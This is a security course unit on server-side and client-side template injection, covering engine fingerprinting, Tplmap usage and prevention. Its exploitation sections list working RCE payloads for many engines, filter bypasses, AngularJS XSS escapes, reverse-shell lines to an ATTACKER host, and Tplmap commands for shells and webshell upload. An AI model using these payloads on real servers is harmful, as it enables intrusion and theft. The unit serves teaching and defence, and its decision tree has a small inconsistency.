# Unit 8: Injection Attacks — Topic 5: Template Injection (SSTI)

## Overview

**Server-Side Template Injection (SSTI)** is a vulnerability that occurs when user input is embedded directly into a server-side template engine's template string, rather than being passed as data to the template. Template engines are designed to combine static templates with dynamic data to generate HTML, emails, PDFs, and other output formats. When an attacker can inject template syntax, they can execute arbitrary code on the server, achieving **Remote Code Execution (RCE)**.

SSTI is classified under **OWASP A03:2021 – Injection**. It is particularly dangerous because:
1. Template engines are designed to execute code — exploitation is often straightforward
2. Many template engines provide direct access to the underlying language runtime
3. Detection can be as simple as injecting `{{7*7}}` and checking if the response contains `49`

```
Safe Usage:                              Vulnerable Usage:
Template Engine                          Template Engine
       |                                        |
Template: "Hello, {{name}}!"            Template: "Hello, " + user_input + "!"
Data:     {name: user_input}             Data:     (none — input IS the template)
       |                                        |
       v                                        v
Output: "Hello, John!"                  Output: "Hello, " + eval(user_input) + "!"
                                                              ^^^^^^^^^^^^^^^^^
                                                         Attacker controls template code!
```

```
SSTI Attack Flow:

+----------+    {{7*7}}     +------------------+    Template Engine    +------------------+
| Attacker | -------------> | Web Application  | ------------------> | Jinja2/Twig/etc. |
+----------+                | (Inserts input   |                     | (Evaluates 7*7)  |
      ^                     |  into template)  |                     +--------+---------+
      |                     +------------------+                              |
      |                            |                                          |
      |     HTTP Response:         |          Result: 49                      |
      |     "Hello, 49!"          |<------------------------------------------+
      +----------------------------+
```

---

## 1. Server-Side Template Injection Fundamentals

### 1.1 What Are Template Engines?

Template engines separate presentation logic from business logic. They allow developers to create HTML templates with placeholders that are filled with dynamic data at runtime.

| Language   | Template Engines                                                 |
|------------|------------------------------------------------------------------|
| **Python** | Jinja2, Mako, Tornado, Django Templates, Chameleon               |
| **PHP**    | Twig, Smarty, Blade (Laravel), Latte                             |
| **Java**   | FreeMarker, Velocity, Thymeleaf, Pebble, Groovy Templates       |
| **Ruby**   | ERB, Slim, Haml, Liquid                                          |
| **Node.js**| Pug (Jade), EJS, Nunjucks, Handlebars, Mustache, Dust.js        |
| **Go**     | html/template, text/template                                     |
| **.NET**   | Razor, DotLiquid                                                 |

### 1.2 Safe vs Vulnerable Template Usage

**Jinja2 — Safe Usage (data passed separately):**
```python
from flask import Flask, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    # SAFE: User input is passed as data, not embedded in template
    template = "Hello, {{ name }}!"
    return render_template_string(template, name=name)
```

**Jinja2 — Vulnerable Usage (input IS the template):**
```python
@app.route('/hello')
def hello():
    name = request.args.get('name')
    # VULNERABLE: User input is concatenated INTO the template string
    template = "Hello, " + name + "!"
    return render_template_string(template)
```

**Vulnerable patterns across languages:**

```python
# Python/Jinja2 — VULNERABLE
render_template_string("Hello " + user_input)
render_template_string(request.args.get('template'))
Template(user_input).render()

# Python/Mako — VULNERABLE
Template(user_input).render()

# PHP/Twig — VULNERABLE
$twig->createTemplate("Hello " . $_GET['name'])->render([])

# Java/FreeMarker — VULNERABLE
new Template("template", new StringReader(userInput), cfg)

# Java/Velocity — VULNERABLE
Velocity.evaluate(context, writer, "tag", userInput)

# Node.js/Pug — VULNERABLE
pug.render(userInput)

# Node.js/EJS — VULNERABLE
ejs.render(userInput)
```

### 1.3 Impact of SSTI

```
+-------------------------------------------------------------------+
|                    SSTI Impact Spectrum                             |
|                                                                    |
|  Severity     Attack                    Example                    |
|  ─────────────────────────────────────────────────────────────────  |
|  Low          Information Disclosure    {{config}}                  |
|               Template syntax leak      {{settings.SECRET_KEY}}    |
|                                                                    |
|  Medium       File Read                 Read arbitrary files       |
|               Internal Data Access      Access internal objects     |
|                                                                    |
|  High         Sandbox Escape            Access Python builtins     |
|               Object Traversal          Navigate class hierarchy   |
|                                                                    |
|  Critical     Remote Code Execution     os.popen('id').read()     |
|               Reverse Shell             Full server compromise      |
+-------------------------------------------------------------------+
```

---

## 2. Template Engine Identification

### 2.1 Detection Methodology

The first step in SSTI exploitation is **identifying which template engine** is in use. Different engines use different syntax, and the correct exploitation technique depends on the engine.

**Universal Detection Payloads:**

| Payload      | Expected Output    | Engines That Process It                      |
|--------------|--------------------|----------------------------------------------|
| `{{7*7}}`    | `49`               | Jinja2, Twig, Nunjucks, Angular (client-side)|
| `${7*7}`     | `49`               | FreeMarker, Velocity, Mako, EL (Java)        |
| `#{7*7}`     | `49`               | Thymeleaf, Ruby ERB (in some contexts)       |
| `<%= 7*7 %>` | `49`               | ERB (Ruby), EJS (Node.js), JSP (Java)        |
| `{7*7}`      | `49`               | Smarty, Dust.js                              |
| `#set($x=7*7)${x}` | `49`        | Velocity                                     |
| `[= 7*7 ]`   | `49`               | Slim (Ruby)                                  |

### 2.2 Decision Tree for Engine Identification

```
                            +---------------------------+
                            | Inject: ${7*7}            |
                            +------------+--------------+
                                         |
                              +----------+----------+
                              |                     |
                           49 returned          Not 49
                              |                     |
                    +---------+--------+    +-------+--------+
                    | Inject: ${7*'7'} |    | Inject: {{7*7}} |
                    +----+--------+----+    +----+-------+---+
                         |        |              |       |
                      '7777777'   49          49 returned  Not 49
                         |        |              |          |
                      +--+--+  +--+---+    +-----+----+  +-+----------+
                      |Jinja2|  |Could |    |Inject:   |  |Inject:     |
                      |      |  |be:   |    |{{7*'7'}} |  |<%= 7*7 %>  |
                      |      |  |Mako  |    +--+---+---+  +--+-----+--+
                      |(wait,|  |EL    |       |   |         |     |
                      |test  |  |Thyme |    7777777 49    49 ret  Not 49
                      |more) |  +------+       |     |       |       |
                      +------+              +--+--+ +-+--+ +-+-+  +-+-+
                                            |Jinja2| |Twig| |ERB|  |???|
                                            +------+ +----+ |EJS|  +---+
                                                             +---+
```

### 2.3 Detailed Engine Fingerprinting

```
Step 1: Try {{7*7}}
  -> 49?  Might be: Jinja2, Twig, Nunjucks, Handlebars (if customized)
  -> Error or literal? Not a {{ }} engine.

Step 2 (if {{7*7}} = 49): Try {{7*'7'}}
  -> '7777777'?  Jinja2 (Python string multiplication)
  -> 49?          Twig (PHP — no string multiplication, does math)
  -> Error?       Nunjucks or other

Step 3 (if ${7*7} = 49): Try ${"freemarker".length()}
  -> 10?          FreeMarker (Java)
  -> Error?       Try Velocity: #set($x=7*7)${x}

Step 4: Engine-specific identifiers:
  Jinja2:     {{config}}     -> returns Flask config object
  Twig:       {{_self}}      -> returns Twig template object
  FreeMarker: ${.version}    -> returns FreeMarker version
  Velocity:   $class.inspect('java.lang.Runtime')  -> returns class info
  Thymeleaf:  __${7*7}__     -> returns 49
  Mako:       ${self.module.__file__}  -> returns template file path
```

### 2.4 Engine Identification Reference Table

| Engine      | Language | Delimiters           | Confirm Payload                          | Output                    |
|-------------|----------|----------------------|------------------------------------------|---------------------------|
| Jinja2      | Python   | `{{ }}`, `{% %}`     | `{{config.items()}}`                     | Flask config dict         |
| Mako        | Python   | `${}`                | `${self.module.__file__}`                | Template file path        |
| Tornado     | Python   | `{{ }}`, `{% %}`     | `{{handler.settings}}`                   | App settings              |
| Django      | Python   | `{{ }}`, `{% %}`     | `{% debug %}`                            | Debug info (if enabled)   |
| Twig        | PHP      | `{{ }}`, `{% %}`     | `{{_self.env.display('hello')}}`         | Outputs 'hello'           |
| Smarty      | PHP      | `{ }`                | `{$smarty.version}`                      | Smarty version            |
| FreeMarker  | Java     | `${}`, `<# >`       | `${.version}`                            | Engine version            |
| Velocity    | Java     | `${}`, `# `         | `$class.inspect('java.lang.String')`     | Class inspector output    |
| Thymeleaf   | Java     | `[[ ]]`, `th:`      | `__${7*7}__`                             | 49                        |
| Pebble      | Java     | `{{ }}`, `{% %}`     | `{{"hello".toUpperCase()}}`              | HELLO                     |
| ERB         | Ruby     | `<%= %>`             | `<%= 7*7 %>`                             | 49                        |
| Pug         | Node.js  | `#{}`, `= `         | `#{7*7}`                                 | 49                        |
| EJS         | Node.js  | `<%= %>`             | `<%= 7*7 %>`                             | 49                        |
| Nunjucks    | Node.js  | `{{ }}`, `{% %}`     | `{{7*7}}`                                | 49                        |
| Handlebars  | Node.js  | `{{ }}`              | `{{#with "s" as |x|}}{{x}}{{/with}}`    | s                         |

---

## 3. Detection Methodology and Decision Trees

### 3.1 Systematic Detection Workflow

```
+------------------------------------------------------+
| Phase 1: IDENTIFY INJECTION POINTS                    |
|                                                        |
| Check all user-controllable inputs:                    |
| - URL parameters (?name=, ?template=, ?message=)      |
| - POST body fields                                     |
| - HTTP headers (rare)                                  |
| - Stored data that's rendered later                    |
| - Error message templates                              |
| - Email templates                                      |
| - PDF generation inputs                                |
| - CMS content fields                                   |
+-------------------------+----------------------------+
                          |
                          v
+-------------------------+----------------------------+
| Phase 2: PROBE WITH MATH EXPRESSIONS                  |
|                                                        |
| Send:  {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {7*7}   |
|                                                        |
| Check response for:                                    |
| - "49" appearing in response (injection confirmed!)    |
| - Error message (syntax recognized but failed)         |
| - Literal string returned (not vulnerable)             |
+-------------------------+----------------------------+
                          |
              +-----------+-----------+
              |                       |
          49 found              Not found
              |                       |
              v                       v
+-------------+----------+  +--------+-------+
| Phase 3: IDENTIFY       |  | Try more       |
| TEMPLATE ENGINE          |  | delimiters or  |
|                          |  | give up        |
| Use fingerprinting       |  +----------------+
| payloads from §2.2       |
+-------------+------------+
              |
              v
+-------------+------------+
| Phase 4: EXPLOIT          |
| Engine-specific payloads  |
| for RCE (see §4)         |
+---------------------------+
```

### 3.2 Context-Aware Detection

Sometimes input lands inside an existing template expression:

```
Scenario 1: Input reflected directly in template
  Template: "Hello, USER_INPUT"
  Test: {{7*7}} -> "Hello, 49" (standard injection)

Scenario 2: Input inside a template variable
  Template: "Hello, {{greeting USER_INPUT}}"
  Test: Need to close existing expression first
  Payload: }}{{7*7}}{{  -> may break out of context

Scenario 3: Input inside a template string
  Template: "Hello, {{'USER_INPUT'}}"
  Test: '}}{{'  or  '+7*7+'
  Need to escape the string context

Scenario 4: Input inside template comment
  Template: "{# USER_INPUT #}"
  Test: #}{{7*7}}{#  -> break out of comment
```

### 3.3 Polyglot Detection Payloads

These payloads work across multiple template engines simultaneously:

```
# Polyglot 1: Tests multiple math expressions
${{<%[%'"}}%\                     -> Triggers errors in most engines

# Polyglot 2: Universal math test
{{7*7}}${7*7}<%= 7*7 %>{7*7}#{7*7}

# Polyglot 3: String concatenation test
{{7*'7'}}${7*'7'}<%= 7*'7' %>

# Polyglot 4: Error-inducing (detects engine by error message)
{{class.getName()}}
${class.getName()}
<%= self.class.name %>
```

---

## 4. Exploitation for RCE in Each Engine

### 4.1 Jinja2 (Python — Flask, Django-Jinja)

Jinja2 is the most commonly exploited SSTI target. It provides access to Python's object hierarchy, which can be traversed to reach dangerous classes like `os` and `subprocess`.

**Information Disclosure:**
```python
# Read Flask configuration (contains SECRET_KEY, database URIs, etc.)
{{config}}
{{config.items()}}
{{request.environ}}
{{self.__dict__}}

# Access request object
{{request.args}}
{{request.headers}}
{{request.cookies}}
```

**Object Traversal for RCE:**

```
Python Object Hierarchy Traversal:

''.__class__                          -> <class 'str'>
''.__class__.__mro__                  -> (<class 'str'>, <class 'object'>)
''.__class__.__mro__[1]               -> <class 'object'>
''.__class__.__mro__[1].__subclasses__()  -> [list of ALL loaded classes]

From the subclass list, find classes that can execute commands:
- subprocess.Popen
- os._wrap_close
- warnings.catch_warnings
- etc.
```

**RCE Payloads:**

```python
# Method 1: Using subprocess.Popen (find its index in subclasses)
# Step 1: List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Find subprocess.Popen (often at index ~400+, varies)
# Or use a loop to find it:
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{cls('id', shell=True, stdout=-1).communicate()}}
  {% endif %}
{% endfor %}

# Method 2: Using os module via catch_warnings
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
# (X = index of a class that imports os, like warnings.catch_warnings)

# Method 3: Using config object (Flask-specific)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Method 4: Using cycler (Flask-specific, very reliable)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Method 5: Using joiner (Flask-specific)
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Method 6: Using lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Method 7: Using request
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}
```

**Jinja2 Filter Bypass Techniques:**

```python
# If '.' is blocked — use attr() filter
{{config|attr('__class__')|attr('__init__')|attr('__globals__')}}

# If '_' is blocked — use request object
{{request|attr(request.args.a)}}&a=__class__

# If '[]' is blocked — use __getitem__
{{config.__class__.__init__.__globals__.__getitem__('os').popen('id').read()}}

# If 'config' is blocked
{{self.__init__.__globals__}}

# Hex encoding to bypass keyword filters
{{""["\x5f\x5fclass\x5f\x5f"]}}  # __class__ in hex

# Unicode encoding
{{""["\u005f\u005fclass\u005f\u005f"]}}
```

### 4.2 Twig (PHP)

```php
# Information disclosure
{{_self.env.display('test')}}
{{app.request.server.all|join(',')}}
{{_self.env.getExtension('Twig\Extension\CoreExtension')}}

# Twig 1.x RCE (deprecated but still found)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 1.x — system()
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# Twig 2.x / 3.x RCE
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}
{{['cat /etc/passwd']|filter('exec')}}

# Twig 3.x — using sort
{{[0]|reduce('system','id')}}

# File read
{{'/etc/passwd'|file_excerpt(0,100)}}

# Environment info
{{app.request.server.get('DOCUMENT_ROOT')}}
{{app.request.server.get('SERVER_SOFTWARE')}}
```

### 4.3 FreeMarker (Java)

```java
# Information disclosure
${.version}                              // FreeMarker version
${.data_model}                          // Data model contents

# RCE — Method 1: Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# RCE — Method 2: ObjectConstructor
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.Runtime")>
${rt.getRuntime().exec("id")}

# RCE — Method 3: JythonRuntime (if Jython available)
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("id")</@jr>

# File read
<#assign is=oc("java.io.InputStreamReader", oc("java.io.FileInputStream", "/etc/passwd"))>
<#assign br=oc("java.io.BufferedReader", is)>
<#list 1..100 as _>
  ${br.readLine()!"--- END ---"}
</#list>

# Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
```

### 4.4 Velocity (Java)

```java
# Information disclosure
$class.inspect('java.lang.Runtime')
$class.type
$class.inspect('java.lang.System').type.getProperty('os.name')

# RCE — Method 1: Runtime.exec()
#set($runtime = $class.inspect('java.lang.Runtime').type.getRuntime())
#set($process = $runtime.exec('id'))
#set($reader = $class.inspect('java.io.BufferedReader').type.newInstance($class.inspect('java.io.InputStreamReader').type.newInstance($process.getInputStream())))
#set($output = '')
#foreach($i in [1..100])
  #set($line = $reader.readLine())
  #if($line)
    #set($output = "$output$line
")
  #end
#end
$output

# RCE — Method 2: Simplified
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..100])
$chr.toChars($out.read())
#end
```

### 4.5 Thymeleaf (Java — Spring)

```java
# Thymeleaf injection (in Spring MVC)
# Often occurs in view name resolution:
# return "page/" + userInput;  // If Thymeleaf resolves this as a template

# Detection
__${7*7}__

# RCE via Spring Expression Language (SpEL)
__${T(java.lang.Runtime).getRuntime().exec('id')}__

# URL-based injection
/page/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# SpEL RCE with output
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__

# File read
__${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}__

# Spring-specific payloads
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### 4.6 ERB (Ruby on Rails)

```ruby
# Detection
<%= 7*7 %>                          # -> 49

# Information disclosure
<%= self %>
<%= ENV.inspect %>
<%= Dir.entries('/') %>

# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read() %>
<%= Kernel.exec('id') %>

# File read
<%= File.read('/etc/passwd') %>
<%= File.open('/etc/passwd').read %>

# Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") %>
```

### 4.7 Pug / Jade (Node.js)

```javascript
// Detection
#{7*7}                              // -> 49

// RCE
#{require('child_process').execSync('id').toString()}

// File read
#{require('fs').readFileSync('/etc/passwd').toString()}

// Reverse shell
#{require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')}

// Environment variables
#{process.env}
#{JSON.stringify(process.env)}
```

### 4.8 EJS (Node.js)

```javascript
// Detection
<%= 7*7 %>                          // -> 49

// RCE
<%= require('child_process').execSync('id').toString() %>

// Alternative (if require is restricted)
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// File read
<%= require('fs').readFileSync('/etc/passwd').toString() %>
```

### 4.9 Nunjucks (Node.js)

```javascript
// Detection
{{7*7}}                             // -> 49

// RCE (via constructor access)
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

// Alternative
{{["id"].__proto__.constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### 4.10 Engine Exploitation Quick Reference

| Engine       | Language | RCE Payload (Simplified)                                                    |
|--------------|----------|-----------------------------------------------------------------------------|
| Jinja2       | Python   | `{{cycler.__init__.__globals__.os.popen('id').read()}}`                     |
| Mako         | Python   | `${__import__('os').popen('id').read()}`                                    |
| Tornado      | Python   | `{% import os %}{{ os.popen('id').read() }}`                                |
| Twig         | PHP      | `{{['id']\|filter('system')}}`                                              |
| Smarty       | PHP      | `{system('id')}`                                                            |
| FreeMarker   | Java     | `${"freemarker.template.utility.Execute"?new()("id")}`                     |
| Velocity     | Java     | `#set($x=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))` |
| Thymeleaf    | Java     | `__${T(java.lang.Runtime).getRuntime().exec('id')}__`                      |
| ERB          | Ruby     | `<%= system('id') %>`                                                       |
| Pug          | Node.js  | `#{require('child_process').execSync('id').toString()}`                      |
| EJS          | Node.js  | `<%= require('child_process').execSync('id') %>`                            |
| Nunjucks     | Node.js  | `{{range.constructor("return require('child_process').execSync('id')")()}}` |

---

## 5. Client-Side Template Injection (CSTI)

### 5.1 What is CSTI?

Client-Side Template Injection occurs when user input is processed by a **client-side** template engine (JavaScript framework) running in the browser. The most common target is **AngularJS**.

```
SSTI vs CSTI:

SSTI:
  Input -> Server Template Engine -> Server executes code -> Response
  Impact: RCE on server

CSTI:
  Input -> HTML Response -> Browser Template Engine -> Browser executes code
  Impact: XSS in victim's browser (not RCE on server)
```

### 5.2 AngularJS CSTI (Template Injection → XSS)

AngularJS evaluates expressions inside `{{ }}` in the browser:

```html
<!-- If user input is reflected inside an ng-app context -->
<div ng-app>
  <p>Hello, {{USER_INPUT}}</p>
</div>
```

**AngularJS XSS Payloads:**

```javascript
// AngularJS 1.0.1 - 1.1.5
{{constructor.constructor('alert(1)')()}}

// AngularJS 1.2.0 - 1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// AngularJS 1.2.2 - 1.2.5
{{'a]'.constructor.prototype.charAt=''.concat;$eval("x]|orderBy:'x]|alert(1)'")}}

// AngularJS 1.2.6 - 1.2.18
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

// AngularJS 1.2.19 - 1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}

// AngularJS 1.2.24 - 1.2.29
{{'a]'.constructor.prototype.charAt=[].join;$eval('x]|orderBy:toString.constructor("alert(1)")')}}

// AngularJS >= 1.6 (shorter)
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

### 5.3 Vue.js CSTI

```javascript
// Vue.js 2.x (if v-html or template compilation is used with user input)
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
```

### 5.4 CSTI Prevention

```
+------------------------------------------------------------------+
| CSTI Prevention:                                                   |
|                                                                    |
| 1. Never insert user input inside ng-app or template contexts      |
| 2. Use ng-bind instead of {{ }} for user data                     |
| 3. Enable Content Security Policy (CSP) to block inline scripts   |
| 4. Upgrade to Angular 2+ (template compilation is server-side)    |
| 5. Sanitize input — encode {{ }} characters                       |
+------------------------------------------------------------------+
```

---

## 6. Tplmap Tool Usage

### 6.1 What is Tplmap?

**Tplmap** (Template Mapper) is an automated SSTI detection and exploitation tool — analogous to SQLMap for SQL injection. It supports multiple template engines and can automatically identify the engine, exploit the vulnerability, and provide an interactive shell.

### 6.2 Installation

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

### 6.3 Basic Usage

```bash
# Basic scan — test a GET parameter
python tplmap.py -u "http://target.com/page?name=test"

# Specify the parameter to test
python tplmap.py -u "http://target.com/page?name=test" -p name

# POST request
python tplmap.py -u "http://target.com/page" -d "name=test"

# With cookies
python tplmap.py -u "http://target.com/page?name=test" \
  --cookie "PHPSESSID=abc123"

# With custom headers
python tplmap.py -u "http://target.com/page?name=test" \
  --headers "Authorization: Bearer eyJ..."

# Through proxy (Burp Suite)
python tplmap.py -u "http://target.com/page?name=test" \
  --proxy "http://127.0.0.1:8080"
```

### 6.4 Exploitation Options

```bash
# Get an interactive shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# Execute a specific command
python tplmap.py -u "http://target.com/page?name=test" --os-cmd "id"

# Read a file
python tplmap.py -u "http://target.com/page?name=test" \
  --read "/etc/passwd"

# Write a file (upload webshell)
python tplmap.py -u "http://target.com/page?name=test" \
  --write "/var/www/html/shell.php" \
  --upload "./shell.php"

# Reverse shell
python tplmap.py -u "http://target.com/page?name=test" \
  --reverse-shell ATTACKER_IP PORT

# Force a specific template engine
python tplmap.py -u "http://target.com/page?name=test" \
  -e jinja2

# Force a specific technique level
python tplmap.py -u "http://target.com/page?name=test" \
  --level 5
```

### 6.5 Tplmap Supported Engines

| Engine     | Language | Code Eval | OS Shell | File Read | File Write | Reverse Shell |
|------------|----------|-----------|----------|-----------|------------|---------------|
| Jinja2     | Python   | ✓         | ✓        | ✓         | ✓          | ✓             |
| Mako       | Python   | ✓         | ✓        | ✓         | ✓          | ✓             |
| Tornado    | Python   | ✓         | ✓        | ✓         | ✓          | ✓             |
| Twig       | PHP      | ✓         | ✓        | ✓         | ✓          | ✓             |
| Smarty     | PHP      | ✓         | ✓        | ✓         | ✓          | ✓             |
| FreeMarker | Java     | ✓         | ✓        | ✓         | ✓          | ✓             |
| Velocity   | Java     | ✓         | ✓        | ✓         | Limited    | Limited       |
| Pebble     | Java     | ✓         | ✓        | ✓         | Limited    | Limited       |
| ERB        | Ruby     | ✓         | ✓        | ✓         | ✓          | ✓             |
| Slim       | Ruby     | ✓         | ✓        | ✓         | ✓          | ✓             |
| Pug        | Node.js  | ✓         | ✓        | ✓         | ✓          | ✓             |
| Nunjucks   | Node.js  | ✓         | ✓        | ✓         | ✓          | ✓             |
| Dust       | Node.js  | ✓         | ✓        | ✓         | ✓          | ✓             |
| EJS        | Node.js  | ✓         | ✓        | ✓         | ✓          | ✓             |
| Marko      | Node.js  | ✓         | ✓        | ✓         | ✓          | ✓             |

### 6.6 Tplmap Example Session

```bash
$ python tplmap.py -u "http://target.com/page?name=John"

[*] Testing if GET parameter 'name' is injectable
[*] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render

[+] Rerun tplmap providing one of the following options:
    --os-shell                 Run shell on the target
    --os-cmd                   Execute commands
    --read PATH                Read remote file
    --write LOCAL REMOTE       Upload file

$ python tplmap.py -u "http://target.com/page?name=John" --os-shell

[+] Run commands on the operating system:

os-shell$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

os-shell$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

os-shell$ uname -a
Linux webserver 5.4.0-89-generic #100-Ubuntu SMP x86_64 GNU/Linux
```

---

## 7. Prevention Techniques

### 7.1 Defense Strategies

```
+-----------------------------------------------------------------------+
|                    SSTI Prevention Hierarchy                            |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 1: NEVER EMBED USER INPUT IN TEMPLATE STRINGS                | |
|  |   Always pass user data as template context variables              | |
|  |   WRONG: render_template_string("Hello " + user_input)            | |
|  |   RIGHT: render_template_string("Hello {{name}}", name=user_input)| |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 2: USE SANDBOXED TEMPLATE ENGINES                            | |
|  |   Jinja2 SandboxedEnvironment, Twig sandbox extension             | |
|  |   Liquid (inherently sandboxed — no system access)                | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 3: INPUT VALIDATION AND SANITIZATION                         | |
|  |   Strip/encode template delimiters: {{ }} {% %} ${ } <% %>       | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 4: USE LOGIC-LESS TEMPLATES WHERE POSSIBLE                   | |
|  |   Mustache, Handlebars — intentionally limited functionality       | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 5: KEEP TEMPLATE ENGINES UPDATED                             | |
|  |   Patches often fix sandbox escape vulnerabilities                 | |
|  +-------------------------------------------------------------------+ |
+-----------------------------------------------------------------------+
```

### 7.2 Secure Code Examples

**Jinja2 — Secure:**
```python
from jinja2 import Environment, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# Option 1: Pass data as context variable (primary defense)
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string("Hello, {{ name }}!", name=name)

# Option 2: Use sandboxed environment
env = SandboxedEnvironment(autoescape=select_autoescape())
template = env.from_string("Hello, {{ name }}!")
output = template.render(name=user_input)
# SandboxedEnvironment prevents access to __class__, __mro__, etc.
```

**Twig — Secure:**
```php
<?php
// Option 1: Pass data as context variable
$template = $twig->createTemplate("Hello, {{ name }}!");
echo $template->render(['name' => $userInput]);

// Option 2: Enable Twig sandbox
$policy = new \Twig\Sandbox\SecurityPolicy(
    ['if', 'for'],           // Allowed tags
    ['upper', 'lower'],      // Allowed filters
    [],                      // Allowed methods
    [],                      // Allowed properties
    ['date']                 // Allowed functions
);
$sandbox = new \Twig\Extension\SandboxExtension($policy, true);
$twig->addExtension($sandbox);
?>
```

**Node.js — Secure (Use Handlebars/Mustache instead of EJS/Pug):**
```javascript
// Handlebars is logic-less — no code execution capability
const Handlebars = require('handlebars');
const template = Handlebars.compile("Hello, {{name}}!");
const output = template({ name: userInput });
// Even if userInput contains {{...}}, it's treated as literal text
```

### 7.3 Prevention Summary Table

| Prevention Measure                   | Effectiveness | Notes                                                 |
|--------------------------------------|---------------|-------------------------------------------------------|
| Pass user data as context variables  | ★★★★★         | Primary defense — eliminates the vulnerability entirely|
| Sandboxed template environment       | ★★★★☆         | Defense-in-depth; sandbox escapes do exist             |
| Logic-less templates (Mustache)      | ★★★★★         | No code execution by design                           |
| Input validation (strip delimiters)  | ★★★☆☆         | Can be bypassed; not reliable as sole defense          |
| WAF rules                           | ★★☆☆☆         | Many bypass techniques; supplementary only             |
| Template engine updates              | ★★★★☆         | Patches fix known sandbox escapes                      |
| CSP headers                         | ★★★☆☆         | Helps for CSTI; irrelevant for SSTI                   |
| Least privilege (process user)       | ★★★★☆         | Limits blast radius if exploitation succeeds           |

---

## Summary Table

| Concept                       | Key Points                                                                                    |
|-------------------------------|-----------------------------------------------------------------------------------------------|
| **What is SSTI**              | Injecting template syntax into server-side templates to execute code on the server             |
| **Root Cause**                | Embedding user input IN the template string instead of passing it AS template data             |
| **Detection**                 | Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` — if response contains `49`, SSTI confirmed          |
| **Engine Identification**     | Use `{{7*'7'}}` to distinguish Jinja2 (`7777777`) from Twig (`49`)                            |
| **Jinja2 RCE**               | Python object traversal: `__class__` → `__mro__` → `__subclasses__()` → `os.popen()`          |
| **Twig RCE**                  | `{{['id']\|filter('system')}}` (Twig 2.x/3.x)                                                |
| **FreeMarker RCE**            | `${"freemarker.template.utility.Execute"?new()("id")}`                                        |
| **Tplmap**                    | Automated SSTI tool — detects engine, exploits for shell, file read/write, reverse shell       |
| **CSTI**                      | Client-side template injection (AngularJS) — leads to XSS, not RCE                           |
| **Prevention**                | Pass user data as context variables; use sandboxed/logic-less templates; never concatenate input|

---

## Revision Questions

